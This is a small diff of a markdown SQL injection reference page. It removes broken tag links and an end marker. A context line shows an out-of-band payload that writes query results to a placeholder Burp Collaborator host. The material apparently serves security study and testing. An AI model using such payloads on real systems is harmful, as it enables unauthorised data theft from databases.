@@ -1,6 +1,6 @@
 # SQL Injection
 
-* SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database #SQL [Injection Attacks](/broken/pages/bdc6cefdfa7c4772f1c479ab5feab060b2fcd6d3) #webhacking [Web Application Vulnerbility](/broken/pages/b354ea7c9a8047788c9d5b4abd55c9282d3b6168)
+* SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database&#x20;
 
 ### Impact of successful SQL Injection attack
 
@@ -1005,6 +1005,3 @@ Useful syntax and platform differences.
     SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
     ```
 
-***
-
-(End of document)
